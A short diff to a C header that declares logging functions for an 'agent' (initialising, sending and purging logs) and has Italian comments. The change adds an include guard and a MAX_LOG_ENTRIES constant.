@@ -1,3 +1,6 @@
+#ifndef _LOG_H__
+#define _LOG_H__
+
 extern void LOG_InitLog(void);
 extern BOOL LOG_InitAgentLog(DWORD);
 extern void LOG_StopAgentLog(DWORD);
@@ -27,6 +30,8 @@ extern HANDLE Log_CreateOutputFile(char *command_name);
 extern BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep);
 extern void LOG_Purge(long long f_time, DWORD size);
 
+#define MAX_LOG_ENTRIES 70
+
 #define LOG_CONF_NEW_FILE 0  // c'e' un nuovo file
 #define LOG_CONF_NOP      1  // non c'e' un nuovo file
 #define LOG_CONF_ERROR    2  // errore ASP
@@ -43,3 +48,5 @@ typedef struct _FileAdditionalData {
 		#define LOG_FILE_VERSION 2008122901
 	UINT uFileNameLen;
 } FileAdditionalData, *pFileAdditionalData;
+
+#endif
